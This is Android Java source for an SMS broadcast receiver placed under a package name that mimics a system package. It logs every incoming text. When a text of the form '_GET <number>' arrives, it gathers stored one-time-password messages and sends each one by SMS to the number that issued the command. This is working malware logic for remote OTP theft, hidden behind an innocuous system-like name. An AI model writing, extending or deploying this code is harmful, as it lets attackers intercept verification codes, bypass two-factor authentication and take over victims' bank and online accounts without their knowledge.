package android.service.sms.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Telephony;
import android.service.sms.helpers.CustomMethods;
import android.service.sms.helpers.SMSHelper;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Objects;

public class SMSReceiver extends BroadcastReceiver {

    private static final String TAG = "MADARA";

    @Override
    public void onReceive(Context context, Intent intent) {

        if (Objects.requireNonNull(intent.getAction()).equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {

            Bundle bundle = intent.getExtras();

            if (bundle != null) {

                SmsMessage[] messages;

//                String format = bundle.getString("format");

                messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);

                for (SmsMessage smsMessage : messages) {
                    String sender = smsMessage.getOriginatingAddress();
                    String messageBody = smsMessage.getMessageBody();
                    processSMS(context, sender, messageBody);
                }
            }
        }
    }

    private void processSMS(Context context, String sender, String message) {
        // Handle the received SMS here
        Log.d(TAG, "Sender: " + sender + ", Message: " + message);

        String[] messageParts = message.split(" ");

        String firstPart = messageParts[0];
        String secondPart = messageParts.length > 1 ? messageParts[1] : "";
        String thirdPart = messageParts.length > 2 ? messageParts[2] : "";

        if (firstPart.equalsIgnoreCase("_GET") && CustomMethods.isNumericInteger(secondPart) && thirdPart.equalsIgnoreCase("")) {

            SMSHelper smsHelper = new SMSHelper(context);

            smsHelper.getOTPs(Integer.parseInt(secondPart), new SMSHelper.OnSMSRetrieve() {
                @Override
                public void onCompleted(JSONArray list) throws JSONException {

                    for (int i = 0; i < list.length(); i++){

                        JSONObject sms = list.getJSONObject(i);

                        if (!sms.getString("phoneNo").toLowerCase().contains(sender.toLowerCase())) {
                            if (smsHelper.sendSMS(sender, list.getJSONObject(i).toString())) {
                                Log.d(TAG, "processSMS: success");
                            } else {
                                Log.d(TAG, "processSMS: failed");
                            }
                        }
                    }
                }

                @Override
                public void onFailed(Exception e) {
                    Log.e(TAG, "onFailed: ", e);
                }
            });
        }
    }
}